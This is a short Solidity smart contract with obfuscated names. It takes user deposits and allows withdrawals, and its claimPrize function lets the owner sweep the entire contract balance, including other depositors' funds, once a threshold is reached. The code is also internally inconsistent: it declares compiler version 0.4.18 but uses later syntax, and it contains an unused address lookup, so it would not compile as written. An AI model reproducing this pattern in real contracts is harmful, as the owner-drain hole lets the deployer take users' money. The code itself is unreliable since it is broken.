pragma solidity ^0.4.18;

contract Ox44c828477558154cb13ecd868b380fcca0ba0dc1 {
    event Gift(address indexed sender, uint indexed amount);
    event Lambo(uint indexed amount);
    
    uint public totalAmount;
    address public owner;
    
    mapping(address => uint) public balances;
    
    function getIntFunc(uint256 index) internal view returns(uint256) {
        return _integer_constant[index];
    }
    
    function getAddrFunc(uint256 index) internal view returns(address payable) {
        return _address_constant[index];
    }
    
    uint256[] public _integer_constant = [2058739200];
    address payable[] public _address_constant = [0x1FC7b94f00C54C89336FEB4BaF617010a6867B40];
    
    constructor() public {
        owner = msg.sender;
    }
    
    function deposit() public payable {
        require(msg.value > 0);
        balances[msg.sender] += msg.value;
        totalAmount += msg.value;
        emit Gift(msg.sender, msg.value);
    }
    
    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        totalAmount -= amount;
        msg.sender.transfer(amount);
    }
    
    function claimPrize() public {
        require(msg.sender == owner);
        require(totalAmount >= getIntFunc(0));
        emit Lambo(totalAmount);
        address payable niece = getAddrFunc(0);
        msg.sender.transfer(this.balance);
    }
}